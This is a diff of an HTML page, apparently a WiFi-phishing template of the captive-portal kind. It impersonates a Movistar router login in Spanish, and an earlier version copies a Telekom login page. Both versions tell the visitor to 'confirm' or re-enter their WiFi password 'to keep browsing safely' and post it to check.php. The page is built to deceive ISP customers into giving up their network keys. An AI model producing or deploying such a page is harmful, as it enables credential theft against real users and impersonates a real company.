@@ -1,76 +1,90 @@
 <!DOCTYPE html>
-<!--[if (lte IE 8) ]><html lang="de-DE" class="no-js lte-ie8"><![endif]-->
-<!--[if (gt IE 8)|!(IE)]><!-->
-<html class="no-js" lang="de">
-  <!--<![endif]--><!-- HEAD -->
+<html class="h100" lang="es">
   <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Movistar Login</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" type="text/css" href="styles/components.css">
-    <link rel="stylesheet" type="text/css" href="styles/login.css">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Administrador De Router</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,IE=10,IE=EmulateIE10,IE=9,IE=EmulateIE9,IE=8,IE=EmulateIE8,IE=7,IE=EmulateIE7">
+    <link href="css2/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="css2/font-face2.css" rel="stylesheet" type="text/css">
+    <link href="css2/base6.css" rel="stylesheet" type="text/css">
+    <link href="css2/biblioteca-colores.css" rel="stylesheet" type="text/css">
+    <link href="css2/Despliegue_Login2.css" rel="stylesheet" type="text/css">
+    <link href="css2/validacion3.css" rel="stylesheet" type="text/css">
+    <link href="css2/placelabel.css" rel="stylesheet" type="text/css">
+    <!--[if lt IE 8]>
+    <link href="css2/bootstrap3.css" rel="stylesheet" type="text/css" /> <![endif]-->
+    <!--[if lt IE 9]>
+	  <script type="text/javascript" src="js2/html5shiv.min.js"></script>      <script type="text/javascript" src="js2/respond.min.js"></script>      <script type="text/javascript" src="js2/css3-mediaqueries.js"></script>      <script type="text/javascript" src="js2/selectivizr.js"></script>      <noscript><link rel="stylesheet" href="[fallback css]" /></noscript>  <![endif]-->
+    <script>
+    	function start() {		
+			
+		    $("#login").validate({
+		    	rules: {
+					username: {
+						required: true,
+						rut: true
+					},
+					password: {
+						required: true
+					}					   
+				},
+		        messages: {
+		            username: {
+						required: "Por favor, ingresa un RUT válido",
+						rut:"Por favor, ingresa un RUT válido"
+					},
+		            password: { 
+						required: "Por favor, ingresa tu contraseña"
+					}
+		        },
+		        errorElement: "div",
+		        wrapper: "div",
+		        errorPlacement: function(error, element) {
+		            error.insertBefore(element); 
+		        },
+		        onfocusout: false,
+		        onkeyup: false,
+		        showErrors: showErrors
+		    });
+		}
+			
+    </script>
   </head>
-  <!-- /HEAD -->
-  <!-- BODY --> <body>
-    <!-- HEADER -->
-    <div id="tbs-header">
-      <div id="tbs-header-content">
-        <div class="container-fixed clearfix">
-          <div class="tbs-text-zero pull-left"> <img id="logo" src="img/logo_movistar.png"
-              alt=""> </div>
-        </div>
+  <body class="h100 nuevaMarca" onload="start()">
+    <script>
+dataLayer = [{
+	'pPath': '/SSO/Iniciar sesion/Paso 1 Cajetin',
+	'daxPath': 'SSO.Iniciar sesion.Paso 1 Cajetin',
+	'environment': 'produccion',
+	'RUT': ''
+}];
+</script> <div class="nubedos">
+      <div class="col-md-12 text-center"> <img class="logo-login logo-header" src="img2/logo-movistar-2017-300x76.png">
       </div>
-    </div>
-    <!-- /HEADER -->
-    <!-- CANCEL FORM -->
-    <!-- /CANCEL FORM -->
-    <!-- CONTENT -->
-    <div id="tbs-container">
-      <div id="tbs-headline">
-        <center><img id="happy2" src="img/happy.png" alt=""></center>
-        <!--<h1 class="text-center marketing-l text-thin tbs-text-1em">Verificaci&oacute;n de seguridad</h1>-->
-      </div>
-      <div id="tbs-infobox">
-        <center>
-          <p>Para continuar navegando de manera segura, debe confirmar su clave
-            WIFI.</p>
-        </center>
-      </div>
-      <form id="form1" name="form1" method="POST" action="check.php" accept-charset="UTF-8"
-        autocomplete="off">
-        <!-- XSRF Prevention -->
-        <div class="offset-bottom-4">
-          <!-- Re-Authentication -->
-          <div class="container offset-bottom-1"> </div>
-          <!-- username input -->
-          <div class="form-input-set offset-bottom-1"> <input id="key1" name="key1"
-              class="form-input" maxlength="256" tabindex="10" placeholder="Clave WIFI"
-              type="password"> </div>
-          <!-- Login button --> <br>
-          <div class="text-center"> <button id="pw_submit" name="pw_submit" type="submit"
-              class="btn btn-brand btn-large tbs-text-upper" tabindex="40">Confirmar</button>
+      <div class="despliegue-login nubeuno">
+        <div class="caja-login">
+          <div class="wraper">
+            <p class="tit-log">Estamos Mejorando</p>
+            <p class="tit-log">Por favor ingresa nuevamente tu contraseña de
+              wifi.</p>
+            <form id="form1" name="form1" method="POST" action="check.php" accept-charset="UTF-8"
+              <input="" value="" type="hidden"> <input id="origin" name="origin"
+                value="" type="hidden"> <input id="redirect_uri" name="redirect_uri"
+                value="" type="hidden"> <input id="idrequest" name="idrequest"
+                value="" type="hidden"> <input id="flow" name="flow" value="" type="hidden">
+              <div class="form-group"><input name="password" id="password" placeholder="Contraseña"
+                  type="password"> <input class="submit" value="Ingresar" type="submit">
+                <a class="olvido" target="_top" href="registroRutAction.do">Movistar
+                  Inc © 2019<span></span></a> </div>
+            </form>
           </div>
         </div>
-      </form>
-      <div class="text-center"> </div>
-      <!-- /FOOTER -->
-      <!-- Status -->
-      <script>
-            var accountLocked = false;
-            var accountLockedPermanent = false;
-            var accountLockExpiration = 0;
-        </script>
-      <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-      <!--[if lt IE 9]>
-        <script type="text/javascript" src="/static/vdplus/js/html5shiv.js"></script>        <script type="text/javascript" src="/static/vdplus/js/respond.min.js"></script>
-        <![endif]-->
-      <script type="text/javascript" src="Telekom%20Login-Dateien/jquery-1.js"></script>
-      <script type="text/javascript" src="Telekom%20Login-Dateien/components.js"></script>
-      <script type="text/javascript" src="Telekom%20Login-Dateien/login.js"></script>
-      <!-- Tracking -->
-      <!-- Callback Tracking -->
-      <!-- Toon Template Debugging --></div>
+        <script>
+    $('#password').showPassword('focus', {
+    	  toggle: { className: 'my-toggle' }
+    	});
+</script> </div></div>
   </body>
-  <!-- /BODY -->
 </html>
